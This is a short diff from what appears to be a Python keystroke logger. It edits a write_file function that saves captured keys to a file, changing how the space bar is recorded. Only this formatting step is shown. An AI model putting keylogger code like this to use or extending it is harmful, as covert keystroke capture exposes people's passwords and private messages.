@@ -19,7 +19,7 @@ def write_file(keys):
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0: # for giving space when space bar is used
-                f.write('\t')
+                f.write(' ')
             elif k.find("enter") > 0: # when enter key is pressed switch to next line
                 f.write('\n')
             elif k.find("Key") == -1:
